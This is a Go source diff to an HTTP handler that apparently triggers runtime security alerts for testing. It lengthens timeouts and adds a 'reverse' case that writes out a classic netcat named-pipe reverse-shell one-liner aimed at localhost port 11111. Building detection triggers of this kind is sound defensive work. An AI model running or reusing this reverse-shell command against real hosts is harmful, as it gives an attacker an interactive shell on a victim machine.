@@ -234,7 +234,7 @@ func run_cmd(w http.ResponseWriter, cmd_opt string) {
 	case "listen":
 		// listen to tcp port 11111 to trigger unexpected listening port event
 
-		var sleep_duration int = 15
+		var sleep_duration int = 30
 
 		listener, err := net.Listen("tcp4", ":11111")
 		if err != nil {
@@ -288,7 +288,7 @@ func run_cmd(w http.ResponseWriter, cmd_opt string) {
 
 	case "nc":
 		// run nc command to trigger unexpected listening port event
-		ctx_duration := 15 * time.Second
+		ctx_duration := 30 * time.Second
 		tcp_port := "11111"
 
 		ctx, cancel := context.WithTimeout(context.Background(), ctx_duration)
@@ -296,6 +296,22 @@ func run_cmd(w http.ResponseWriter, cmd_opt string) {
 
 		cmd_out, err := exec.CommandContext(ctx, "nc", "-lvp", tcp_port).Output()
 		fmt.Fprintf(w, "Running command \"nc -lvp %s\"\n", tcp_port)
+		if err == nil {
+			fmt.Fprintf(w, "%s\n", cmd_out)
+		} else {
+			fmt.Fprintf(w, "%s\n", err)
+		}
+
+	case "reverse":
+		// initiate a reverse shell command to trigger reverse shell event
+		ctx_duration := 30 * time.Second
+		tcp_port := "11111"
+
+		ctx, cancel := context.WithTimeout(context.Background(), ctx_duration)
+		defer cancel()
+
+		cmd_out, err := exec.CommandContext(ctx, "rm", "-f", "/tmp/f", ";", "mknod", "/tmp/f", "p", ";", "cat", "/tmp/f", "|", "/bin/sh", "-i", "2>&1", "|", "nc", "127.0.0.1", tcp_port, ">", "/tmp/f").Output()
+		fmt.Fprintf(w, "Running command \"rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 %s\" "+"> /tmp/f\n", tcp_port)
 		if err == nil {
 			fmt.Fprintf(w, "%s\n", cmd_out)
 		} else {
